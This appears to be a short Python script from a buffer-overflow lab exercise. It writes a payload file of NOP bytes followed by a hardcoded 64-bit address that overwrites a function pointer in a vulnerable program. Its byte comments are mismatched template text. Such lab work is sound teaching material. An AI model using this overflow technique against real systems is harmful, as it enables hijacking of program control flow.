#!/usr/bin/python3
import sys




content = bytearray(16)
for i in range(8):
	content[i] = 0x90

#########################################################################

offset = 8
#with detection address

content[offset+7] = 0x00   # filin the 1st byte (most significant byte)
content[offset+6] = 0x00   # fill in the 2nd byte
content[offset+5] = 0x55   # fill in the 3rd byte
content[offset+4] = 0x55   # fill in the 4th byte (least significant byte)
content[offset+3] = 0x55   # fill in the 1st byte (most significant byte)
content[offset+2] = 0x55   # fill in the 2nd byte
content[offset+1] = 0x4f   # fill in the 3rd byte
content[offset+0] = 0x6a   # fill in the 4th byte (least significant byte)
#########################################################################

#55 55 55 55 4f 6a
"""
content[offset+7] = 0x00   # filin the 1st byte (most significant byte)
content[offset+6] = 0x00   # fill in the 2nd byte
content[offset+5] = 0x55   # fill in the 3rd byte
content[offset+4] = 0x55   # fill in the 4th byte (least significant byte)
content[offset+3] = 0x55   # fill in the 1st byte (most significant byte)
content[offset+2] = 0x55   # fill in the 2nd byte
content[offset+1] = 0x48   # fill in the 3rd byte
content[offset+0] = 0x19   # fill in the 4th byte (least significant byte)
"""
#print(content)
# Write the content to badfile

file = open("fun_ptr_overflow", "wb")
file.write(content)
file.close()
